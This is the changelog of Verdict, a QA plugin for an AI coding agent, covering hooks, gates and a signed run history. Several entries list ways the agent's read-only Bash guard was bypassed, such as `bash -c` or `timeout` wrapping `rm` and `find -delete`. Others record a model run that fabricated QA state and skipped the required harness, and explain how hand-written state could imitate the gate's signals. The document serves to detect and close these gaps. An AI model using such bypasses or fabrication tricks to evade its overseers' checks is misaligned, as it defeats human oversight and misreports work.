test: if the maintainer would reasonably schedule a finding for next week, it is Minor,
however interesting. The reviewer's exact complaint — one of two Majors did not clear the
bar — and inflated Majors are not caution, they are noise that trains the reader to skim
past the real ones.

**Control:** the flagship pricer delta held at **6/6** and the liar sweep at **6/6 x3**
after the edits, so the severity bar moved the `conftest` row (which requires
Blocker/Critical) nowhere and the handoff change moved the delta classes nowhere.

`_list_shape` was extracted from `validate()`, which the new field pushed over the
complexity budget — extraction, not a raised threshold, the same discipline the Bash
guard's dispatcher followed. 506 tests; the three new contracts each mutation-checked.

## 0.46.0 — 2026-08-31 · "what the first outside user hit"

The first external run of Verdict — a stranger's financial project, three real
production defects found in one pass — came back with a review, and this release is
the four items from it that need no prompt change. (The prompt items — severity
strictness and a "verified intact" section — wait for one eval-paid release together
with the owed liar re-measurement, because a prompt edit is a behaviour change.)

**Trust is now the first screen of the README.** Installing a plugin means letting
its code run in every session, and the reviewer was blunt: he audited the hook
sources himself, and the average user will not. A table before the Quickstart now
says exactly what installs — six hook registrations, what each fires on, and when
each is silent (the scope guards are no-ops without `VERDICT_STRICT=1`; everything
fails open; the Stop hook blocks at most once and never loops) — plus the
per-repository install recipe for people who prefer not to install globally.

**A gate dramatically slower than its own history is now a measured fact.** The
reviewer's project had three tests silently start calling a live CLI: the suite went
3s → 65s and burned a week of subscription quota, while the number sat in
facts.json, measured and uncompared. `duration_regressed` does the comparison —
median of the gate's own last five runs, fired only past both a 3x factor and a 5s
absolute floor, so a 0.07s gate tripling stays quiet. Prior durations ride in
`runs.jsonl` as `gate_durations`, deliberately **excluded from the chain body**: had
they been signed, every pre-upgrade state — including this repository's own
committed `.qa/` — would re-derive as tampered. Telemetry is not worth signing;
verdicts still are.

**`verdict-run --skip-unchanged`.** The objection every low-churn project raises
against a nightly — *"but I don't change code every day"* — answered with
arithmetic instead of a schedule: when HEAD equals the last run's sha and no
quarantine has expired, the runner re-gates the standing verdict and spends no
model run. Exact-sha on purpose, not `code_drift`: one commit behind is a reason
*to* run. An expired quarantine forces a run even on unchanged code, because
re-evaluating a flake is work only a model can do. Opt-in — the nightly's
semantics do not change silently.

**The runner is no longer a black box.** `capture_output=True` meant an empty log
until the very end and no trace at all if the parent died — the reviewer was bitten
twice. The transcript now streams into the log as it happens, and a heartbeat line
(`VERDICT_HEARTBEAT_S`, default 60s) reports elapsed and quiet time whenever the
child goes silent. A hung run is visible while it hangs.

Also from the review, no code needed: findings-to-PR-comments already exists
(`verdict-gate --format github-comment`, posted as a sticky comment by the Action) —
which the reviewer, who read the source closely enough to audit the hooks, did not
find. That is its own argument for the README change above.

503 tests. Every new contract mutation-checked: disabling the duration comparison,
dropping the fact before facts.json, ignoring HEAD movement, ignoring quarantine
expiry, muting the stream, and signing the telemetry each turn the suite red.

## 0.45.0 — 2026-08-31 · "the same three mistakes, one layer out"

0.44.0 closed six specific commands an audit had found. Re-probing the *classes*
those six belonged to — a wrapper that hides the real command, indirection, and a
verb set that was never finished — found eighteen more still open. Fixing named
instances is not the same as fixing the defect, and this release is the difference.

**`git pull` was not in the mutator set.** It is `fetch` plus `merge`: it rewrites
the working tree, and it was the widest git-shaped hole left. So were `submodule`,
`bisect`, `update-ref`, `gc`, `prune`, `filter-branch`, `sparse-checkout`, `notes`,
`replace` and `reflog`. Read-only forms are exempted rather than blanket-denied —
`git branch` lists, `git submodule status` reports, `git config --get` reads — because
a guard that denies those is one people switch off. The exemption is checked against
flags too: a first-non-flag scan walked straight past `--get` and denied it.

**Wrappers hid the head.** `timeout`, `nice`, `ionice`, `stdbuf`, `setsid`, `doas`
and friends were not in the wrapper set at all, so `timeout 5 rm f.txt` read
`timeout` as the command. Worse, the wrappers that *were* listed had their own
value-taking flags ignored, so `sudo -u nobody rm f.txt` left `nobody` as the head —
exactly the git-flag defect from 0.44.0, one call earlier in the chain.

**`bash -c "rm f.txt"` was opaque, and did not have to be.** An interpreter's `-c`
is genuinely unanalysable and stays out of scope. A *shell's* is not: this module
is a shell parser. It now re-enters itself on the nested command, bounded to three
levels.

**`xargs rm` reads its targets from stdin**, where no static check can follow. That
is the same situation as an unresolved `$variable`, and it now gets the same answer
instead of passing. The first attempt used `"-"` as the sentinel target, which
`_target_ok` reads as a flag and waved through — the sentinel is now a value no path
can collide with.

**Also:** `awk -i inplace` and `tar -x` mutate without ever spelling `-i`.

`_check_segment` outgrew its complexity budget doing all this and is now a dispatcher
over one function per command family. The budget was not raised: a guard nobody can
follow is a guard nobody extends, which is how a verb set goes unfinished in the
first place.

488 tests. Every fix mutation-checked, and every one paired with a false-positive
case — `timeout 300 pytest`, `bash -c "pytest -q"`, `xargs grep`, `tar -c`, and the
ten read-only git forms all still pass.

## 0.44.0 — 2026-08-31 · "the guard had less jurisdiction than it claimed"

An external audit of the strict-mode Bash guard. Six ways past it, one hole in the
path predicate, and one claim in the eval README that described a check which could
not fire. Every one reproduced before it was fixed; every one now has a regression
test that goes red when the fix is reverted.

**The guard had no jurisdiction where it mattered most.** `_tmp_roots()` allow-listed
the entire temp root as scratch — and `run_eval.py` builds its checkout with
`mkdtemp`. So during *every eval run*, the code under test sat outside the guard's
reach, and CI that clones into `/tmp` was in the same position. The eval README's
"zero false-positive blocks" was therefore a statement about nothing; the fixture's
byte-identity is what actually proved the tree was untouched, and the README now says
so. A temp root is still scratch, but **a git checkout inside one is code under
test**, not scratch. This was the first thing the fix's own probe demonstrated: a
test repository created with `mktemp -d` let `rm` through before the change.

**Value-taking git flags swallowed the verb.** The parser consumed `-C` and nothing
else, so `git -c core.editor=true commit -am x` read `core.editor=true` as the
subcommand, found it in no mutator set, and passed. Same for `--work-tree`,
`--git-dir`, `--namespace`. Their arguments are now eaten, and `-C`/`--work-tree`
re-point the checkout the mutation is judged against.

**In-place editing is rarely spelled `-i`.** The check tested `startswith("-i")`,
which sees neither `perl -pi -e` (clustered behind `-p`) nor `sed --in-place`. Both
edited files with the guard silent. Short-option clusters and the long form are now
read, and `-e`'s script argument is no longer mistaken for a target.

**`find` was in no mutator set at all**, so `find . -delete` and `find -exec rm`
passed. Both are covered.

**`is_allowed_path` accepted any path with a `.qa` component**, so
`<repo>/src/.qa/x` — a directory inside the code under test — was writable QA scope.
Team mode now means the repository's own root: the `.qa` must sit beside a real
`.git`. QA scope is also checked *before* the temp rule, so a `.qa/` inside a
repository that happens to live under `/tmp` stays writable — the tester must always
be able to write its own findings.

**The README oversold the guarantee.** "Read-only on your code, by construction" is
true of the file tools — there is no `Edit` tool, and a hook confines writes — but
Bash is a heuristic, and a heuristic that an audit walked past six ways should not be
described as construction. The claim now separates the two and says the OS is the
real boundary, matching the wording the case study already used.

**And the 1-in-3 trap is now measured rather than judged.** `eval/fixtures/liar/`
plants a conftest that skips every collected test; v0.43.0 recorded that Verdict
caught it 1 run in 3 and left it open, because fixing it looked like a prompt change.
It is not: "every collected test was skipped" is arithmetic. `executed_nothing()`
computes it in the harness, and `verdict-facts` reports it per gate, so the judgment
step receives it already established — the same measure-first rule every other number
in the run already follows. No prompt was edited.

Found by external audit; reproduced, fixed, and regression-tested here. 449 tests.

## 0.43.0 — 2026-08-30 · "the prompt is a contract too"

`agents/verdict.md` is the product — the judgment lives in it — and it was the largest
surface here with no automated coverage. Verdict said so about itself in two consecutive
runs, and both times the honest answer was that measuring what a model *does* with a
prompt requires running one.

**So this covers the other half, in plain CI with no model.** `tests/test_agent_contract.py`
holds the prompt to its contract with the code around it: every `${CLAUDE_PLUGIN_ROOT}`
path it tells the agent to read resolves; every `/verdict:` command and `verdict-*` script
it tells the agent to run is shipped and declared; every screaming-case enum value it
teaches is one `validate.py` accepts, and every delta and failure classification the
harness can write is one the prompt explains; every `§` cross-reference lands; and no
promised gate exit code is one the gate cannot emit.

That is not behaviour. It is the guarantee that the prompt still describes the system
that exists — which is precisely what a rename breaks, and which otherwise fails at
runtime in someone else's repository rather than here. `eval/README.md` now says which
half is which, because a green suite must not be mistaken for behavioural coverage.

**The first version of the section checker reported a defect that was not one.** It read
`§8.2` as a missing subsection, when the prompt writes `§N.M` two legitimate ways —
`§3.5` and `§4.5` are subsection headings, `§8.2` is principle 2 *within* section 8. The
prompt was correct and the checker was too strict; the checker learned both notations
rather than the prompt being edited to suit it. A prompt edit is a behaviour change, and
this release deliberately makes none.

Every contract is mutation-checked: a stale plugin-root path, a route to an unshipped
command, an undeclared script, a rejected enum value, a dropped delta, and an impossible
exit code each turn the suite red. Five parametrised enum cases that could only ever skip
were removed — a permanently-skipped test looks like coverage and is not.

## 0.42.0 — 2026-08-30 · "the run history signs itself"

**`--require-harness` was defeated by imitation, not forgery** (`VERDICT-F-12`, filed by
Verdict auditing itself). Exit 6 rests on two durable signals, and both were satisfiable
by copying: `state_computed` checks that a key holds a dict, `report_rendered` checks for
a fixed footer string. Both sit in the committed `.qa/` artifacts a fabricating model
reads before it writes. Adding `"calibration": {}` and pasting the footer flipped a
hand-written state from exit 6 to exit 0.

**Each finalized run now signs the run history.** Every `runs.jsonl` row carries
`chain` = `sha256(previous chain + this row, canonical JSON)`, and `state.json` records
the same value in `last_run.chain`. The difference from a constant is that the value
depends on the row beneath it, so a link copied forward from the previous run does not
verify.

**The state is bound to the link, not just the history.** The first version of this
signed the history row only — and a laundered `state.json` left `runs.jsonl` untouched,
so the chain stayed intact and the attack still passed. Caught by running the attack
rather than by reasoning about it. The row is *derived* from the state, so re-deriving
it and checking that it still reproduces the recorded link catches an edit made after
signing. The four cases, exercised end-to-end against a signed copy of this repo's own
QA root:

| | before | after |
|---|---|---|
| honest signed run | 0 | **0** |
| launder the state in place, imitate both old signals | 0 | **6** |
| fabricate a run, copy the last link forward | 0 | **6** |
| project from before the chain existed | 0 | **0** — plus a note |

**Two deliberate limits, both stated rather than hidden.** A history with no links reads
`unchained`, not broken, so no existing installation starts failing its own gate — but
the gate now *says* the history is unsigned, because a project that cannot yet be
protected otherwise looks exactly like one that is. One `verdict-finalize` run signs it.
And once any row is signed, a later row that drops its link is a break rather than a
downgrade: without that ratchet a fabricator would simply omit what it cannot compute.

None of this makes fabrication impossible. A model that reimplements the chain correctly
can still hand-write a state — at which point it has done most of the work the harness
would have done. What changes is that the cheap version fails loudly.

Also here: the `repo`/`qa_root` fixtures moved to `tests/conftest.py`. Importing them by
name made every test signature a redefinition of an imported symbol — thirty lint errors
and a pattern that would have spread with each new test file.

## 0.41.0 — 2026-08-30 · "the gate can see it too"

0.40.0 taught the session banner that a verdict ages in commits. The banner only
misleads a reader. **The gate merges code**, and `get_verdict` over MCP is what the
documented CI loop calls to make that decision — so both were still blind to the
same thing, on the side where it costs the most.

- **`verdict-gate --max-commits-behind N`** — exit 5 when the tested commit is more
  than N behind `HEAD`, and exit 5 unconditionally when it is not in `HEAD`'s history
  at all. Opt-in, exactly like `--max-age-hours` and `--min-run-number`: existing
  pipelines do not start failing, and there is a test that says so.
- **Deliberately silent when the distance cannot be measured.** A shallow clone, an
  absent commit or an unresolvable repository is `unknown`, and `unknown` never fails
  the gate. A gate that goes red on a shallow clone is a gate people route around,
  which costs more than the check earns.
- **`get_verdict` now returns `code_drift`** alongside the verdict, so a caller
  deciding a merge is told the distance instead of assuming the answer still
  describes the code in hand.
- Exposed as `max-commits-behind` on the Action, and as an opt-in flag on
  `verdict-run`.

**`state.repo_for_root()`** makes the link the gate needed: a QA root back to the
repository it describes. Team mode is structural (`<repo>/.qa`); solo mode reads the
profile's `Repo-Path:` header. Written both ways in the wild — the first pattern
matched **none** of the six live roots on this machine, because the profiles the
agent generates use `**Repo-Path:** \`/path\`` and only a hand-written one used the
bare form. Measured across all of them rather than assumed.

**Why `--max-commits-behind` is opt-in on `verdict-run` and not on by default**, even
though the run gates its own output moments later: a profile's `Repo-Path` records the
*main* worktree — that is what keeps the project key stable across worktrees — so a
run executed inside a linked worktree writes a sha the main worktree's HEAD has never
seen. Defaulting it on would have turned a healthy nightly red. The caveat is recorded
next to the function rather than in a commit message.

One thing this release does **not** claim to have fixed. `code_drift` resolves a squash
merge that preserved the tested tree. When a branch gains further commits before being
squashed, the tree that was measured exists nowhere in the resulting history, and the
honest answer is `diverged` — the verdict really does describe code this branch does
not have. That is now pinned by a test rather than left to be rediscovered as a bug.
This repository's own committed state is in exactly that position, and the gate says so.

## 0.40.0 — 2026-08-30 · "a verdict ages in commits"

**A stored verdict goes stale two ways, and only one of them is a clock.** This
repository's own SessionStart banner opened a session announcing three open Major
findings. All three had been fixed and merged in the six commits since the state was
written — four hours earlier. Nothing was corrupt: only a run resolves findings. But
every consumer read the state as current, because the only staleness signal in the
product was a seven-day rule and the state had not aged. **The code had moved.**

- **`state.code_drift(repo, sha)`** measures that once, for every consumer:
  `current` · `behind N` · `diverged` · `unknown`. `unknown` is load-bearing rather
  than a fallback — a shallow clone, an absent commit or a non-repo is not an alarm,
  because one false "you are behind" teaches people to skip the line.
- **The session banner puts the qualification above what it qualifies**, so a reader
  meets *measured 6 commits ago — findings below may already be fixed* before the
  findings, not after them. `/verdict:status` gains the same rule beside its 7-day
  one; neither substitutes for the other.
- **A timestamp in the future rendered as `-26422d ago`.** Fabricated timestamps are a
  documented failure mode here, and a state that misreports when it was written is a
  state to distrust. It now says so, and suppresses the 7-day line rather than
  double-reporting. Surfaced by a test fixture, not by a user.

**Then Verdict ran on itself and found a Major defect in the feature above.**
`VERDICT-F-10`: ancestry is not content. A squash merge replaces a branch with a new
commit carrying the identical tree, so `git merge-base --is-ancestor` says *no* the
moment a PR lands — and `code_drift` called that `diverged`, i.e. *"this verdict
describes different code"* about code that is byte-identical. Every PR in this
repository is squash-merged and `.qa/state.json` is committed, so **it would have
fired on `main` immediately.** Reproduced before accepting it: same tree
`58b51987`, `git diff --stat` empty, `--is-ancestor` exit 1, verdict `diverged`.

The fix asks what a commit *contained* rather than where it sat — walk back for a
commit whose tree matches the one recorded, and the distance to it is the honest
answer; only when no commit carries that content is the code really different.
Squash-merged now reads `current`, squash-merged-then-two-commits reads `behind 2`,
genuinely different content still reads `diverged`. A non-`0`/`1` return from
`--is-ancestor` is an error, not an answer, and reads `unknown`.

Two things Verdict was right to insist on beyond the one line: the same modelling
error was **duplicated in prose** in `commands/status.md`, where a code-only fix
would have left the agent making the claim anyway; and both existing divergence
tests built divergence from content that genuinely differed, so there was no
negative case — which is how a proven false positive shipped inside 140 lines of
new tests. Both corrected.

**Also fixed, all filed by that same run:** the rename-desync guard matched the
command name with `startswith`, so `/specification` satisfied stem `spec`
(`VERDICT-F-16`); `action.yml` still documented its exit code as `0/1/3/4/5` after
gaining `6` (`VERDICT-F-14`); and the stale-command-name guard enumerated four
paths by hand, missing `README-pypi.md` — the page PyPI renders (`VERDICT-F-15`).
Widening that sweep immediately proved the *pattern* also needed tightening: it
matched any `/qa-` substring and flagged `.../worktrees/qa-nightly`, a directory
name. It now names the eleven commands that have ever existed and nothing else.

**The run itself:** run 3, delta over `062feed..0a9269a`, verdict `pass with risks`,
gate exit 0 under `--require-harness`. All four previously open findings closed
**fix-verified on demonstrated evidence** rather than on the claim that they were
fixed — F-5 by differential on the same tree at the same moment, F-6 by driving exit
6 through the real gate, F-8 by re-injecting the mutant, F-9 on the exact crash
input. `F-11` is also fixed here: the published sdist included `tests/` but not the
`eval/`, `hooks/` and `commands/` trees they import, so the distribution's own
suite could not run — collection error, 123 failures on a `git archive` build.
`tests/` is now absent rather than completed, because completing it costs ~1.1MB
against a 124KB archive to ship tests nobody downstream runs, and a suite that
cannot run is worse than no suite. Built and checked: 88KB, 17 entries, no test
tree and no session worktrees; the wheel is unchanged, installs clean, and all
six console scripts answer `--help` reporting 0.40.0.

Two findings remain open and are not addressed here: `F-12`
(`--require-harness` is defeated by imitation, not just forgery — both durable
signals are visible in the committed `.qa/` artifacts a fabricating model would
copy), and `F-13` (`fixture_freshness` reproduces the fixture lossily: mode
changes, symlink swaps and planted untracked files are invisible, and a missing
tracked file tracebacks).

`.qa/state.json` here records `F-10` as open: it is what run 3 measured at
`0a9269a`, and the fix came after. The banner this release adds is what now says so.

## 0.39.0 — 2026-08-30 · "ten commands"

**Breaking: every command is renamed, and two are gone.** Twelve commands become ten.

- **The `qa-` prefix is dropped from all nine.** Plugin commands have no short form — a
  bare `/verdict` is an unknown command, measured rather than assumed — so the name a
  user actually types was `/verdict:qa-status`, which says QA twice. The namespace
  already carries it. It is `/verdict:status` now, and `/verdict:baseline`,
  `/verdict:bug`, `/verdict:cause`, `/verdict:charter`, `/verdict:flake`,
  `/verdict:regression`, `/verdict:release`, `/verdict:spec`.
- **`/qa-delta` and `/qa-review` are removed**, not renamed. Both were the daily pass
  under two names, and `/verdict:run` — the front door added in 0.30.0 — already reads
  the stored state and picks baseline, delta, or a scoped review on its own. Keeping
  them meant three doors into one room, with the two older ones unable to do the
  routing. The front door is the only door.
- **No deprecation stubs.** The old names now answer `Unknown command`. This was checked
  rather than assumed to be safe: the nightly loop (`verdict-run`) and `action.yml` both
  drive **natural-language prompts, not slash commands**, so no scheduled or CI run
  invokes a removed name. `docs/nightly.md`, the README, the issue template and the
  demo SVG all recorded `/qa-review` or `/qa-delta` in copy-pasteable recipes; all are
  updated. Anyone with a personal script that types the old names must update it.

**The command set is now a checked contract** (`tests/test_commands.py`). The README's
command table drifting from `commands/` is not cosmetic — a documented command that
answers `Unknown command` reads as the plugin being broken — and this rename touched
twenty-odd references across nine files by hand, which is exactly the operation that
leaves one behind. The tests assert the table and the directory are the same set, that
every command carries the front matter that makes it selectable, that no command routes
to a sibling that is not shipped, and that no live doc still names a `/qa-` command.
Each was mutation-checked: reverting one table row, one cross-reference, and one command
file's front matter each turns the suite red.

**The eval harness can no longer desync on a rename.** `eval/run_eval.py` copies a
shipped command file into a scratch project and then invokes it by name, from two
independent fields — provision `qa-spec.md`, invoke `/qa-spec`. A rename that moved one
and not the other failed as a mystery *inside* the model run, where it looks like the
agent ignoring its instructions. The harness now checks the file exists and that the
prompt invokes the stem it was provisioned as, and exits with the mismatch named.

Historical CHANGELOG entries, the dated eval results table, and `eval/corpus/*/meta.json`
keep the names used at the time. They record what ran, not what is shipped.

## 0.38.0 — 2026-08-30 · "the last two findings from the self-review"

- **`VERDICT-F-5` — the tamper-evidence gate cried wolf.** `eval/fixtures/pricer-delta.diff`
  is the committed record of how rev-A differs from rev-B, regenerated and compared so
  fixture drift cannot silently change what the seeded eval measures. The comparison used
  `git diff --no-index`, which **does not honour `.gitignore`** — so running the fixture's
  own tests once produced `__pycache__/`, the regenerated diff grew, and the gate reported
  tampering of a file nobody had touched. Reproduced exactly: a 78-line anchor against an
  86-line regeneration, every extra line a build artifact. A tamper alarm that fires on
  `__pycache__` is one people learn to ignore, which is worse than not having one.

  `eval/fixture_freshness.py` compares **tracked files only**, copied to a scratch tree —
  `git ls-files` being the same definition of "the fixture" the repository already uses, so
  artifacts cannot enter and a real edit, staged or not, still shows. Verified in both
  directions: a two-line edit to `pricer.py` fails the gate, an untracked file does not.
  CI and the profile now call that one script, because a gate defined twice is how this
  repository has already drifted three times.

- **`VERDICT-F-8` — three tests that passed while measuring nothing.** In `test_mutate.py`
  the assertions lived *inside* `for mutant in generate(source)`, so a `generate()` that
  regressed to returning `[]` would leave all three green while the mutation engine
  produced no mutants — the tool that measures suite quality, its own suite measuring
  nothing. Emptiness is now asserted before the loop. Verified by neutering the operator
  set: `AssertionError: the operator set collapsed: 0 mutants`, where the old tests passed.

That closes every finding from the self re-baseline: F-1 through F-4 resolved by the
re-baseline itself, F-6 and F-9 in 0.36.0, F-5 and F-8 here.
## 0.37.0 — 2026-08-30 · "a name on PyPI, and what the sdist nearly took with it"

The MCP server becomes installable from PyPI. Preparing that release turned up two things
worth stating plainly.

- **The distribution is `verdict-qa-mcp`, not `verdict-mcp`.** That name was registered on
  PyPI on 2026-08-23 by an unrelated project in the same niche — an MCP server giving
  verification feedback to coding agents ([Dgotlieb/verdict-mcp](https://github.com/Dgotlieb/verdict-mcp),
  four alpha releases). Parallel invention, six days before our launch, and theirs was
  first. **Only the name PyPI indexes moved**: the console script is still `verdict-mcp`,
  the import package is still `verdict_mcp`, the plugin is still `verdict`. `__init__.py`
  moved with it — `version("verdict-qa-mcp")` — because the version lookup keys on the
  *distribution* name, and leaving it behind would have made every real install report
  itself as `0+unknown` down the `PackageNotFoundError` path.
- **The sdist was shipping 332 files of agent session worktrees.** hatchling honours
  `.gitignore` but not `.git/info/exclude`, which is where `.claude/worktrees/` is excluded
  — so a default build swept in full duplicate copies of this repo, eval fixtures and all,
  at 937 KB. Now an anchored allowlist: 32 entries, 124 KB. The anchoring is the load-bearing
  part — these are gitignore-style globs, so an unanchored `README.md` matched at *any*
  depth and pulled the worktree copies straight back in through the allowlist that was
  supposed to stop them. No secrets were in the archive; it was bloat, not a leak. Caught
  before the first upload, which is the only time it can be caught — a PyPI version number
  can never be reused.
- **Published by Trusted Publishing**, tag-triggered, tests re-run in the release job before
  anything is built. There is no PyPI token in this repository and none on the maintainer's
  machine: a leaked token is the usual way a small package gets hijacked, and the safest
  token is the one that does not exist.
- **`README-pypi.md`** — the plugin README is written for GitHub and a dozen of its links
  are relative to the repo, which resolve to nothing on a PyPI page. The distribution now
  ships its own front page describing the server and the CLIs it actually installs.

## 0.36.0 — 2026-08-30 · "two findings the tool made about itself"

Yesterday's re-baseline reviewed this repository and filed nine findings. These are the two
that mattered, both defects introduced by this project's own last two days of work.

- **`VERDICT-F-6` — the anti-fabrication check was unreachable from CI.** `--require-harness`
  shipped in 0.22.0, was wired into `verdict-run` and into `/verdict:run`, had tests for
  exit 6 — and `action.yml` exposed no input for it, so no workflow could ask, including
  this repository's own `qa-gate.yml`. A guard nobody can invoke is the failure the Stop
  hook was built to fix, reappearing one layer up. The Action takes `require-harness` now,
  and the self-gate turns it on.

  Plumbing it naively would have been wrong in the deployment it exists for. A team-mode
  `.qa/` gitignores `facts.json` and `judgment.json` — per-run scratch — so a fresh CI
  checkout finds neither, however honestly the run was measured. The gate now decides on
  the **durable** traces: `calibration`, written only by `merge`, and the report footer,
  emitted only by the renderer. Those survive a checkout, and they are the stronger
  evidence anyway — `facts.json` existing proves the measuring step ran, not that
  `finalize` consumed it. The other two are reported and no longer required. Verified
  against this repo's own committed state, which the naive version would have refused.

- **`VERDICT-F-9` — `verdict-finalize` crashed on a string `prose`.** `render_report`
  called `.get` on it and raised a bare `AttributeError`; the intake validator added in
  0.27.0 — built precisely to explain judgment errors in the author's own terms — never
  checked the field. Fixed at both boundaries: `validate_judgment` now names the expected
  shape and says a bare string crashed the renderer, and the renderer treats any
  non-object prose as empty, because losing a whole run to a typo is worse than losing a
  narrative section.

`VERDICT-F-5` (the freshness gate is not hermetic) and `VERDICT-F-8` (vacuous loop tests)
remain open, aged, and carried.

## 0.35.0 — 2026-08-30 · "the tool stops shipping a stale verdict of itself"

The committed `.qa/` was a v0.12-era snapshot, and it was not merely untidy — the self-gate
was **publishing** it, posting `VERDICT-F-1 | Major/P1 | 0d | Scope guards use abspath not
realpath` onto every pull request. That finding shipped fixed in v0.12.1. So did the other
three: `VERDICT-F-2` said `.qa/` was untracked, which stopped being true when someone
tracked it; F-4 was already resolved.

- **Re-baselined against the current tree**, through the harness, at v0.34.0. All four old
  findings are recorded `RESOLVED` on evidence rather than deleted — the delta memory is
  the point. Nine findings tracked, verdict `pass with risks`.
- **`verdict-validate --at-rest`** checks a state as a *file* rather than as a run that
  just happened: it drops the "over a day old" rule and nothing else. The two are different
  questions. Freshness belongs to a run; a committed state is stale by tomorrow morning by
  construction, and a CI job asking whether the team's checked-in baseline is well-formed
  should not be told no for the crime of being a week old. A timestamp in the *future*
  stays a violation either way — that is broken, not old.
- **CI validates the committed state at rest** before serving it as a verdict, so this
  cannot silently rot again. The reason is written into the workflow.
- **`.qa/.gitignore`** separates the shared record from per-run scratch: `state.json`, the
  reports, `runs.jsonl`, `outcomes.json` and the profile are the team's baseline and belong
  in git; `facts.json`, `judgment.json` and `state.json.prev` describe one machine's
  execution and do not.

**What the re-baseline found — four open, all `confidence: proven`, and three of them are
defects in this project's own last two days of work:**

- `VERDICT-F-5` (Major) — `fixture_freshness`, the tamper-evidence gate, false-fails: it
  uses `git diff --no-index`, which ignores `.gitignore`, so the gate is not hermetic.
- `VERDICT-F-6` (Major) — the GitHub Action exposes no `require-harness` input, so the
  exit-6 check added in 0.22.0 is **unreachable from CI**. The guard exists and CI cannot
  ask for it.
- `VERDICT-F-9` (Major) — `verdict-finalize` crashes with a raw `AttributeError` when
  `judgment.prose` is a string, and the intake validator added in 0.27.0 never checks that
  field. The check built to explain judgment errors has a hole shaped exactly like one.
- `VERDICT-F-8` (Minor) — three tests in `test_mutate.py` assert only inside a
  `for mutant in …` loop, so they pass vacuously if the list is ever empty.

## 0.34.0 — 2026-08-30 · "the implementer gets the memory too"

- **A `SessionStart` hook puts the tester's findings in front of the next session.** The
  asymmetry it fixes was measured, not imagined: Verdict filed eleven evidenced findings on
  a live site — one a release blocker reading *deploying this branch strips every
  production security header* — and the very next session in that repository did a full SEO
  pass and touched none of them. Not the blocker, not the application form that reports
  success when its handoff failed, not the WCAG failures on both primary CTAs. The findings
  were in `state.json` the whole time. `next_run_focus` existed but only Verdict reads it;
  `get_findings` existed over MCP but nothing called it unprompted.
- **Verified as a hook, not as a function.** In a scratch session with a planted finding,
  the model answered "is there outstanding QA work here?" by naming `ZEBRA-F-42` —
  *"according to the startup status"* — without running a single command.
- **Built to be read.** It leads with release blockers, then open counts by severity and the
  oldest age, then the top findings that were not already named as blockers, then the
  next-run focus. Memory older than a week is flagged rather than served as current, a
  clean project gets one line, and the closing line says these are findings, not
  instructions — the hook informs a session, it does not commandeer one. Silent in a repo
  with no QA state and on every failure path.

## 0.33.1 — 2026-08-30

- **`${CLAUDE_PLUGIN_ROOT}` is text, not an environment variable — now said so.** Claude
  Code substitutes the token when it *loads* the agent and command files, so the path an
  agent reads there is real; but `$CLAUDE_PLUGIN_ROOT` in a Bash call expands to nothing,
  turning `ls $CLAUDE_PLUGIN_ROOT/src` into `ls /src`. Measured directly
  (`ROOT=[UNSET]`), after a live run on a real project logged one failed command —
  "Failed to inspect verdict plugin layout" — and recovered on the next step. §0 now
  states it where the agent first meets the token, and the two places that hand a command
  line to a shell (§6's harness invocation, `/verdict:run`'s self-gate) say
  `<plugin-root>` with the resolved path rather than the literal token.

## 0.33.0 — 2026-08-30 · "the guard that does not need remembering"

- **A `Stop` / `SubagentStop` hook enforces the harness.** Every other check in this system
  sits downstream of a tool the model must choose to call, and yesterday a run of
  `/verdict:run` demonstrated the gap: it wrote to the default state root while
  `$VERDICT_HOME` pointed elsewhere, invented a project key, skipped `verdict-facts` and
  `verdict-finalize` entirely, and produced a confident `FAIL`. Both guards that would have
  caught it stayed silent because nothing invoked them. The hook fires on the turn ending
  instead: if a QA run just left hand-written state on disk, it blocks the stop once and
  says what to redo.
- **It is built to stay quiet.** Four conditions must all hold before it speaks — not
  already continuing because of this hook (never loop), a QA root resolves from the
  session's cwd, `state.json` was written within the last half hour, and the harness traces
  are missing. Otherwise it exits in about two stat calls: **37 ms measured**, at the end
  of a turn. Bad JSON, a failed import, an unreadable state — all exit 0 silently, because
  a hook that bricks sessions is worse than the problem it polices.
- **Proven as a hook, not just as a function.** Nine unit tests, seven of them about
  silence; then a live session with hand-written state planted, where the hook intercepted
  the stop and the model came back with "verdict QA state must flow through the proper
  harness workflow… never written directly."
- **And the first version was wrong, caught by this repo's own CI.** It judged recency by
  the state file's *mtime*, and `git checkout` stamps every file with the current time —
  so on a fresh CI checkout the hook fired on Verdict's own committed team-mode `.qa/`.
  mtime is not evidence that a run happened; copying a file is not running one. Recency
  now comes from the `last_run.timestamp_utc` the run itself recorded, which a copy cannot
  forge. The same fix removed an `os.getcwd()` fallback for an event with no `cwd`: not
  knowing where you are is a reason to stay silent, not a reason to look somewhere else.
  Both cases are now permanent tests.

## 0.32.0 — 2026-08-30 · "gate your own run"

- **`/verdict:run` now gates itself.** Before the handoff it runs
  `verdict-gate --require-harness --min-run-number <n>` against what it just wrote, and
  reports the exit code and reason verbatim as the first line of the handoff. The command
  spells out what each code means and forbids explaining a 6 away.
- **Why, measured rather than asserted.** A haiku-model run of this command wrote to the
  default state root while `$VERDICT_HOME` pointed elsewhere, invented a project key
  (`frontdoor-repo` where the mechanical rule gives `repo`), skipped the harness entirely
  (no `facts.json`, no `calibration` block), used a finding id outside the required
  format, and typed `schema_version` as a string — while producing a confident,
  plausible-looking `FAIL` that found the seeded defect correctly. A separate probe
  confirmed `$VERDICT_HOME` *did* reach the session's Bash tool, so the variable was
  ignored, not lost.

  Every one of those violations has a guard already built. **None fired, because nothing
  invoked them.** The enforcement in this system is downstream of a tool the model must
  choose to call, and `verdict-run` closes that for scheduled runs by gating from outside;
  the interactive path had nothing. This step is what invokes them.

  It remains a prompt rule, and prompt rules are exactly what that haiku run ignored — so
  it is a real improvement for a capable model and an honest partial fix, not a guarantee.
  The guarantee wants a stop-hook that fires whether or not the model remembers.

## 0.31.0 — 2026-08-30 · "/verdict:run"

- **The front door is `/verdict:run`**, renamed from the `/verdict:verdict` that 0.30.0
  shipped hours earlier. Plugin commands are namespaced and must be typed in full, so the
  file name is the second half of what a user types — `verdict.md` stuttered.
- **The short-form claim in the README was wrong, and is now measured.** 0.30.0 said a
  client "may accept the short form" where the name is unambiguous. Tested headlessly
  against the installed plugin: `/verdict` returns `Unknown command`, while
  `/verdict:qa-status` resolves and runs. There is no short form; the README says so.

## 0.30.0 — 2026-08-30 · "a front door"

- **`/verdict`** — the command a newcomer types. Ten commands each owned a specific job
  and none owned "just run it", so the entry point was knowledge you had to already have:
  baseline first, then delta, unless a re-baseline trigger tripped. That is routing the
  state can do itself. `/verdict` resolves the QA root, reads `state.json`, and picks the
